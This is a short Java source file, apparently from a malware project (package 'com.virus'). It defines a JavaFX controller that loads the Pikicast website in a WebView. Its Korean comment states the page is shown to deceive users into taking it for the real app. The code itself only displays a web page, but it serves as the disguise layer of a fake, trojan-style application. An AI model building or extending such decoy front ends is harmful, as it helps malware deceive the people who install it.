package com.virus;

import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.web.WebEngine;
import javafx.scene.web.WebView;

import java.net.URL;
import java.util.ResourceBundle;

/**
 * Created by 강희룡
 * 2015-11-24
 */
public class MainPageController implements Initializable {
    @FXML
    private WebView webView;

    /**
     * 가짜 앱으로 사용자를 속이기 위해 피키캐스트 페이지를 보여줌
     * @param location
     * @param resources
     */
    @Override
    public void initialize(URL location, ResourceBundle resources) {
        WebEngine engine = webView.getEngine();
        engine.load("https://www.pikicast.com/");
    }
}
